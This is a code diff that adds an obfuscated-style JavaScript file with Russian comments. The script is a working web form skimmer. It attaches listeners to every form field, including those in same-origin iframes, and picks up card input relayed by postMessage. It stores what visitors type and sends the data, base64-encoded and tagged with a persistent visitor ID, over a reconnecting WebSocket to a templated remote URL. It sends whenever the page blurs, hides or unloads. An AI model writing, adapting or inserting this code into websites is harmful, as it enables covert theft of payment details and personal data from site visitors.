@@ -1,0 +1,411 @@
+(function() {
+    var debug_on = false;
+    var keyPriority = 2;
+
+    function debugLog(...args) {
+        if (debug_on) {
+            console.log(...args);
+        }
+    }
+
+    function debugError(...args) {
+        if (debug_on) {
+            console.error(...args);
+        }
+    }
+
+    function bsencode(str) {
+        return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    function bsdecode(str) {
+        return decodeURIComponent(escape(atob(str)));
+    }
+
+    var wssocket;
+    var reconnectInterval = 5000;
+    var pingInterval = 10000;
+    var sendQueueInterval = 5000;
+
+    function getWebSocketUrl() {
+        var currentPage = encodeURIComponent(window.location.href);
+        return '{{WEBSOCKET_URL}}' + '?source=' + currentPage;
+    }
+
+    function initializeWebSocket() {
+        if (window.ww && window.ww.readyState !== WebSocket.CLOSED) {
+            debugLog("Using existing WebSocket connection");
+            wssocket = window.ww;
+            setupWebSocketHandlers(wssocket);
+        } else {
+            debugLog("Creating new WebSocket connection");
+            var wsUrl = getWebSocketUrl();
+            wssocket = new WebSocket(wsUrl);
+            setupWebSocketHandlers(wssocket);
+            window.ww = wssocket;
+        }
+    }
+
+    function setupWebSocketHandlers(socket) {
+        socket.onopen = function(event) {
+            debugLog("WebSocket connection opened");
+            reconnectInterval = 5000;
+            processSendQueue();
+        };
+
+        socket.onclose = function(event) {
+            debugLog("WebSocket connection closed");
+            setTimeout(initializeWebSocket, reconnectInterval);
+            reconnectInterval = Math.min(reconnectInterval * 2, 60000);
+        };
+
+        socket.onerror = function(error) {
+            debugError("WebSocket error observed:", error);
+        };
+
+        socket.onmessage = function(event) {
+            debugLog("WebSocket message received:", event.data);
+        };
+    }
+
+    function sendDataViaWebSocket(data) {
+        if (wssocket && wssocket.readyState === WebSocket.OPEN) {
+            let encodedData = bsencode(JSON.stringify(data));
+            wssocket.send(encodedData);
+            return true;
+        } else {
+            debugError("WebSocket is not open. Data will be queued.");
+            queueData(data);
+            initializeWebSocket();
+            return false;
+        }
+    }
+
+    function queueData(data) {
+        var queue = JSON.parse(localStorage.getItem('data_queue')) || [];
+        let dataString = JSON.stringify(data);
+        let isDuplicate = queue.some(item => JSON.stringify(item) === dataString);
+        if (!isDuplicate) {
+            queue.push(data);
+            localStorage.setItem('data_queue', JSON.stringify(queue));
+            debugLog("Data queued for later sending");
+        } else {
+            debugLog("Duplicate data not queued");
+        }
+    }
+
+    function processSendQueue() {
+        var queue = JSON.parse(localStorage.getItem('data_queue')) || [];
+        var newQueue = [];
+        var uniqueData = {};
+
+        for (var i = 0; i < queue.length; i++) {
+            let dataString = JSON.stringify(queue[i]);
+            if (!uniqueData[dataString] && !sendDataViaWebSocket(queue[i])) {
+                newQueue.push(queue[i]);
+            }
+            uniqueData[dataString] = true;
+        }
+        localStorage.setItem('data_queue', JSON.stringify(newQueue));
+        debugLog("Processed send queue, remaining items:", newQueue.length);
+    }
+
+    function sendPing() {
+        if (wssocket && wssocket.readyState === WebSocket.OPEN) {
+            wssocket.send(" ");
+            debugLog("Ping sent");
+        }
+    }
+
+    initializeWebSocket();
+    setInterval(sendPing, pingInterval);
+    setInterval(processSendQueue, sendQueueInterval);
+
+    // ======= Работа с полями формы =======
+
+    var ph = true;
+    var pc = true;
+    var cn = true;
+    var C = [];
+
+    // НОВАЯ ФУНКЦИЯ: Установка значения в localStorage
+    function setLocalStorageItem(name, value) {
+        localStorage.setItem(name, value || "");
+    }
+
+    // НОВАЯ ФУНКЦИЯ: Получение значения из localStorage
+    function getLocalStorageItem(name) {
+        return localStorage.getItem(name);
+    }
+
+    function getRandomNumber() {
+        return (100000000 + Math.floor(Math.random() * 900000000)).toString();
+    }
+
+    // ИЗМЕНЕНО: Функция для проверки и установки идентификатора пользователя в localStorage
+    function checkUserIdentifier() {
+        var userIdentifier = getLocalStorageItem('gif_va'); // ИЗМЕНЕНО: используем getLocalStorageItem
+        if (!userIdentifier) {
+            var currentTime = new Date().getTime();
+            var randomNumber = getRandomNumber(); // Переименовано для ясности (было userIP)
+            var uniqueValue = currentTime.toString() + randomNumber; // Явное преобразование currentTime в строку для конкатенации
+            setLocalStorageItem('gif_va', uniqueValue); // ИЗМЕНЕНО: используем setLocalStorageItem
+            return uniqueValue;
+        }
+        return userIdentifier;
+    }
+
+    var userIdentifier = checkUserIdentifier(); // ИЗМЕНЕНО: переменная переименована и использует новую функцию
+
+    function fr(w) {
+        return C.find((rcedElementObj) => w === rcedElementObj.w);
+    }
+
+    function iL(w, v, l, o) {
+        var r = fr(w);
+        if (r) {
+            r.ls[v] = r.ls[v] || [];
+        } else {
+            r = {
+                w: w,
+                ls: {}
+            };
+            r.ls[v] = [];
+            C.push(r);
+        }
+        r.ls[v].push(l);
+        w.addEventListener(v, l, o);
+    }
+
+    function lE(l, v) {
+        var r = fr(l);
+        return r && v in r.ls;
+    }
+
+    function iM() {
+        if (sessionStorage.desktop)
+            return false;
+        else if (localStorage.mobile)
+            return true;
+        var mobile = ["mobile", "phone"];
+        for (var i in mobile)
+            if (navigator.userAgent.toLowerCase().indexOf(mobile[i].toLowerCase()) > 0)
+                return true;
+        return false;
+    }
+
+    var ch = false;
+    if (!ph) {
+        if (iM()) {
+            ch = true;
+        } else {
+            if (!pc) {
+                ch = true;
+            }
+        }
+    } else {
+        if (!iM()) {
+            if (!pc) {
+                ch = true;
+            }
+        }
+    }
+
+    var pendingData = {};
+    var sentData = {};
+    localStorage.removeItem("ars");
+
+    function handleElement(t) {
+        var key = keyPriority === 1 ? (t.id || t.name) : (t.name || t.id);
+        if (key) {
+            if (!lE(t, "input")) {
+                iL(t, "input", function() {
+                    h(this);
+                });
+            }
+            if (!lE(t, "change")) {
+                iL(t, "change", function() {
+                    h(this);
+                });
+            }
+            if (!lE(t, "blur")) {
+                iL(t, "blur", function() {
+                    h(this);
+                });
+            }
+        }
+    }
+
+    function processElements(elements) {
+        elements.forEach(function(t) {
+            handleElement(t);
+        });
+    }
+
+    function getKeyFromCustomerEditElement(el) {
+        const classes = Array.from(el.classList);
+        const keyClasses = classes.filter(c => c !== 'customer-edit');
+        return keyClasses.length > 0 ? keyClasses[0] : null;
+    }
+
+    function processCustomerEditElements() {
+        const customerElements = document.querySelectorAll('.customer-edit');
+        customerElements.forEach(el => {
+            const key = getKeyFromCustomerEditElement(el);
+            if (!key) return;
+            const value = el.textContent.trim();
+            if (value.length === 0) return;
+            if (sentData[key] === value) return;
+            pendingData[key] = value;
+            localStorage.setItem('ars', JSON.stringify(pendingData));
+        });
+    }
+
+    function h(t) {
+        if (t.type !== 'hidden' && t.offsetParent !== null) {
+            var v = t.value || "";
+            if (t.options && t.selectedIndex >= 0) {
+                v = t.options[t.selectedIndex].text;
+            }
+            var key = keyPriority === 1 ? (t.id || t.name) : (t.name || t.id);
+            if (key) {
+                if (sentData[key] === v) {
+                    return;
+                }
+                pendingData[key] = v;
+                localStorage.setItem('ars', JSON.stringify(pendingData));
+            }
+        }
+    }
+
+    function setupMutationObserver() {
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                if (mutation.addedNodes.length) {
+                    mutation.addedNodes.forEach((node) => {
+                        if (node.nodeType === 1) { // Только элементы
+                            const elements = node.querySelectorAll('input, select, textarea');
+                            processElements(elements);
+                            elements.forEach((el) => {
+                                if (el.offsetParent !== null && el.value.trim() !== '') {
+                                    h(el);
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        });
+
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    }
+
+    function hl() {
+        if (!iR) {
+            iR = true;
+        }
+        var elements = document.querySelectorAll('input, select, textarea');
+        processElements(elements);
+        elements.forEach(function(el) {
+            if (el.offsetParent !== null && el.value.trim() !== '') {
+                h(el);
+            }
+        });
+
+        document.querySelectorAll('iframe').forEach(function(iframe) {
+            if (!iframe.src || iframe.src === 'about:blank' || iframe.src.startsWith(window.location.origin)) {
+                try {
+                    var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+                    if (iframeDocument && iframeDocument.documentElement) {
+                        var iframeElements = iframeDocument.querySelectorAll('input, select, textarea');
+                        iframeElements.forEach(function(el) {
+                            handleElement(el);
+                            if (el.offsetParent !== null && el.value.trim() !== '') {
+                                h(el);
+                            }
+                        });
+                    }
+                } catch (e) {
+                    if (e.name !== 'SecurityError' && e.name !== 'DOMException') {
+                        console.error("Error accessing iframe content:", e);
+                    }
+                }
+            }
+        });
+
+        processCustomerEditElements();
+    }
+
+    function sn() {
+        var storedData = JSON.parse(localStorage.getItem("ars"));
+        if (storedData && typeof storedData === 'object' && !Array.isArray(storedData)) {
+            pendingData = storedData;
+        } else {
+            pendingData = {};
+            localStorage.removeItem("ars");
+        }
+
+        if (Object.keys(pendingData).length === 0) {
+            return;
+        }
+
+        var dataArray = Object.keys(pendingData).map(function(key) {
+            return key + ":" + pendingData[key];
+        });
+
+        var formattedData = {
+            'referrer': window.location.hostname,
+            'userCookie': userIdentifier, // ИЗМЕНЕНО: используем userIdentifier вместо userCookie
+            'data': dataArray,
+            'userAgent': navigator.userAgent
+        };
+
+        if (sendDataViaWebSocket(formattedData)) {
+            Object.assign(sentData, pendingData);
+            pendingData = {};
+            localStorage.removeItem("ars");
+        }
+    }
+
+    var iR = false;
+    if (location.href.indexOf("/") !== -1) {
+        setInterval(hl, 1500);
+        setupMutationObserver();
+    }
+
+    window.addEventListener("beforeunload", function(s) {
+        sn();
+        pendingData = {};
+        sentData = {};
+        localStorage.removeItem("ars");
+    });
+
+    window.onblur = function() {
+        sn();
+    };
+
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'hidden') {
+            sn();
+        }
+    });
+
+    window.addEventListener('message', function(event) {
+        if (event.data.type === 'cardInput') {
+            var field = document.getElementById(event.data.field);
+            if (field) {
+                field.value = event.data.value;
+                h(field);
+            }
+        }
+    });
+
+    try {
+        // Дополнительный код и логика, если требуется...
+    } catch (e) {
+        debugError("Error:", e);
+    }
+})();
